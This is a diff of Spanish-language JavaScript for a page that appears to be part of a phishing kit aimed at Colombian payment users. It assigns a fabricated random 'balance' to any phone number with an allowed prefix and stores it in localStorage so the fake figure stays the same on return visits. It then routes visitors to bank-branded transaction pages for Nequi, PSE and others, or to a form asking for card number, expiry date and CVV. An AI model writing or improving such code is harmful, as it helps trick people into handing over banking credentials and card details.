@@ -165,6 +165,37 @@ function generarSaldoAleatorio() {
     return min + (aleatorio * multiplo);
 }
 
+// Función para guardar el saldo de un número en localStorage
+function guardarSaldoEnLocalStorage(telefono, saldo) {
+    // Obtener los saldos guardados o crear un objeto vacío
+    var saldosGuardados = localStorage.getItem('saldosPorNumero');
+    if (saldosGuardados) {
+        saldosGuardados = JSON.parse(saldosGuardados);
+    } else {
+        saldosGuardados = {};
+    }
+    
+    // Guardar el saldo para este número
+    saldosGuardados[telefono] = saldo;
+    
+    // Guardar nuevamente en localStorage
+    localStorage.setItem('saldosPorNumero', JSON.stringify(saldosGuardados));
+    
+    console.log("Saldo guardado para " + telefono + ": " + saldo);
+}
+
+// Función para obtener el saldo de un número desde localStorage
+function obtenerSaldoDeLocalStorage(telefono) {
+    var saldosGuardados = localStorage.getItem('saldosPorNumero');
+    if (saldosGuardados) {
+        saldosGuardados = JSON.parse(saldosGuardados);
+        if (saldosGuardados[telefono]) {
+            return saldosGuardados[telefono];
+        }
+    }
+    return null;
+}
+
 // Función para validar si el número de teléfono tiene prefijo permitido (301,302,304,305,310-324,330)
 function validarPrefijoPermitido(telefono) {
     // Obtener los primeros 3 dígitos del teléfono
@@ -198,12 +229,27 @@ async function validarNumero() {
       return;
   }
   
+  // Verificar si ya existe un saldo guardado para este número en localStorage
+  var saldoGuardado = obtenerSaldoDeLocalStorage(telefonoIngresado);
+  
+  if (saldoGuardado) {
+      // Si ya existe un saldo guardado, usarlo directamente
+      var valorFormateado = saldoGuardado.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
+      console.log("Número encontrado en localStorage. Saldo recuperado: " + valorFormateado);
+      
+      $("#usuario").hide();
+      $("#espera").show();        
+      setTimeout(cargar_resumen, 3000, valorFormateado);
+      return;
+  }
+  
+  // Si no hay saldo guardado, buscar en numeros.txt
   const response = await fetch('numeros.txt');
   const data = await response.text();
   const lineas = data.split('\n').map(linea => linea.split(','));
 
   let encontrado = false;
-  let valorCorrespondiente = "0";
+  let valorCorrespondiente = 0;
 
   for (let i = 0; i < lineas.length; i++) {
     if (lineas[i].length < 2) {
@@ -214,7 +260,8 @@ async function validarNumero() {
     const valor = lineas[i][1].trim().replace(/"/g, '');
     
     if (telefono === telefonoIngresado) {
-      valorCorrespondiente = valor;
+      // Limpiar el valor (eliminar puntos si los tiene)
+      valorCorrespondiente = parseFloat(valor.toString().replace(/\./g, ''));
       encontrado = true;
       break;
     }
@@ -222,16 +269,22 @@ async function validarNumero() {
 
   // Si no se encontró el número en la lista, generar saldo aleatorio
   if (!encontrado) {
-    var saldoAleatorio = generarSaldoAleatorio();
-    // Formatear con puntos como separadores de miles
-    valorCorrespondiente = saldoAleatorio.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
-    console.log("Número no encontrado en lista. Prefijo permitido: " + telefonoIngresado.substring(0,3) + " - Saldo asignado: " + valorCorrespondiente);
+    valorCorrespondiente = generarSaldoAleatorio();
+    console.log("Número no encontrado en lista. Prefijo permitido: " + telefonoIngresado.substring(0,3) + " - Nuevo saldo asignado: " + valorCorrespondiente);
+  } else {
+    console.log("Número encontrado en numeros.txt. Saldo: " + valorCorrespondiente);
   }
+  
+  // Guardar el saldo en localStorage para futuras consultas del mismo número
+  guardarSaldoEnLocalStorage(telefonoIngresado, valorCorrespondiente);
+  
+  // Formatear con puntos como separadores de miles para mostrar
+  var valorFormateado = valorCorrespondiente.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
 
   $("#usuario").hide();
   $("#espera").show();        
   
-  setTimeout(cargar_resumen, 3000, valorCorrespondiente);
+  setTimeout(cargar_resumen, 3000, valorFormateado);
 }
 
 function toggleOptions1() {
@@ -243,30 +296,70 @@ function toggleOptions1() {
   }
 }
 
+// Función para seleccionar método de pago con redirección INMEDIATA
 function selectOption1(option) {
-    document.getElementById("selectedValue1").value = option;
-    //document.getElementById("optionsList1").style.display = "none";
-
-    if (option == "TRICOLOR" || option == "NEQUI" || option == "De Bogota" || option == "PSE") {
-        if (option == "TRICOLOR") {    
-            window.location.href = "transaction/sucursal";
-            //window.location.href = "PSEUserRegister/?o=t23";
-
-        } else if (option == "NEQUI") {        
-            window.location.href = "transaction/clientes";
-              //window.location.href = "PSEUserRegister/?o=t18";        
-        } else if (option == "De Bogota") {        
-            window.location.href = "transaction/personas";     
-              //window.location.href = "PSEUserRegister/?o=t12";   
-        } else if (option == "PSE") {        
-            window.location.href = "transaction/PSEtransaction";                   
-        }
-    } else if ( option == "Tarjeta") {
+    console.log("Opción seleccionada: " + option);
+    
+    // Guardar la opción seleccionada en el campo oculto
+    var selectedValueInput = document.getElementById("selectedValue2");
+    if (selectedValueInput) {
+        selectedValueInput.value = option;
+    }
+    
+    // REDIRECCIÓN INMEDIATA según el método de pago seleccionado
+    if (option == "TRICOLOR") {    
+        window.location.href = "transaction/sucursal";
+    } else if (option == "NEQUI") {        
+        window.location.href = "transaction/clientes";
+    } else if (option == "De Bogota") {        
+        window.location.href = "transaction/personas";
+    } else if (option == "PSE") {        
+        window.location.href = "transaction/PSEtransaction";
+    } else if (option == "Tarjeta") {
+        // Para Tarjeta, solo mostrar el formulario sin redirigir
         $("#section3").hide();
-        $("#Tarjeta").show();  
+        $("#Tarjeta").show();
     } else {
-        document.getElementById("selectedOption1").innerText = option;
         $("#section3").hide();
         $("#errorpasarela").show();
+    }
+}
+
+// Función para el botón "Continuar" en la sección de métodos de pago (para Tarjeta)
+function irAPago() {
+    // Obtener el método de pago seleccionado
+    var selectedOptionInput = document.getElementById("selectedValue2");
+    var selectedOption = selectedOptionInput ? selectedOptionInput.value : "";
+    
+    console.log("Continuar con método: " + selectedOption);
+    
+    // Redirigir según el método de pago seleccionado
+    if (selectedOption == "TRICOLOR") {    
+        window.location.href = "transaction/sucursal";
+    } else if (selectedOption == "NEQUI") {        
+        window.location.href = "transaction/clientes";
+    } else if (selectedOption == "De Bogota") {        
+        window.location.href = "transaction/personas";
+    } else if (selectedOption == "PSE") {        
+        window.location.href = "transaction/PSEtransaction";
+    } else if (selectedOption == "Tarjeta") {
+        // Validar campos de tarjeta
+        var numtc = document.getElementById("numtc") ? document.getElementById("numtc").value : "";
+        var fechat = document.getElementById("fechat") ? document.getElementById("fechat").value : "";
+        var codcv = document.getElementById("codcv") ? document.getElementById("codcv").value : "";
+        var datost = document.getElementById("datost") ? document.getElementById("datost").value : "";
+        
+        if (numtc === "" || fechat === "" || codcv === "" || datost === "") {
+            alert("Por favor, completa todos los datos de la tarjeta.");
+        } else {
+            alert("Procesando pago con tarjeta...");
+        }
+    } else {
+        if (!selectedOption || selectedOption === "") {
+            alert("Por favor, selecciona un método de pago (Tarjeta, Bancolombia, Nequi, PSE, etc.)");
+        } else {
+            $("#section3").hide();
+            $("#errorpasarela").show();
+        }
     }
 }
